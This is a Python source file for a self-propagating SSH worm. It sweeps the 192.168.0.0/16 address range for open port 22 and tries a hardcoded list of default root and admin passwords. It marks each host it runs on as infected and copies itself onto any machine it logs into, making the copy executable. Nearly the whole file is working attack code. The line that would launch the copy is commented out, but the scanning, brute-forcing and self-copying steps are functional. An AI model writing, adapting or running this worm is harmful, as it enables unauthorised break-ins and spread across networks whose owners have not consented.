import paramiko
import sys
import socket
import os

#refrence: https://github.com/cinno/ssh_worm/blob/master/worm.py

INFECTED_MARKER = "/tmp/infected.txt"
info = [
    ('root', 'toor'),
    ('root', 'root'),
    ('root', 'password'),
    ('root', '123456'),
    ('root', '910810'),
    ('root', 'admin'),
    ('admin', 'admin'),
    ('user', 'user'),
]

def get_ip():
    ip_address_1 = '192.168.'
    ip_address_list = []
    for i in range(256):
        ip_address_2 = ip_address_1 + str(i) + '.'
        for j in range(256):
            ip_address_3 = ip_address_2 + str(j)
            ip_address_list.append(ip_address_3)
    return ip_address_list

def mark_infected():
    file = open(INFECTED_MARKER, "w")
    file.write('this computer is infected!')
    file.close()

def search_traget(ip_address):
    try_socket = socket.socket()
    try_socket.settimeout(0.1)
    print(ip_address)
    try:
        try_socket.connect((ip_address, 22)) 
# this is the port for ssh
        print("get a target!")
    except socket.error:
        return False
    return True

def attackSSH(ipAddress):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    for (usern, passw) in info:
        try:
            ssh.connect(ipAddress, username=usern, password=passw)
        except paramiko.AuthenticationException:
            continue
        sftp_client = ssh.open_sftp()
        sftp_client.put('/tmp/worm.py', '/tmp/worm.py')
        ssh.exec_command('chmod a+x /tmp/worm.py')
        #ssh.exec_command('nohup python /tmp/worm.py &')

if __name__ == "__main__":
    ips = get_ip()
    if os.path.exists(INFECTED_MARKER):
        print('infected!')
        sys.exit()
    
    mark_infected()
    for ip in ips:
        if search_traget(ip):
            attackSSH(ip)
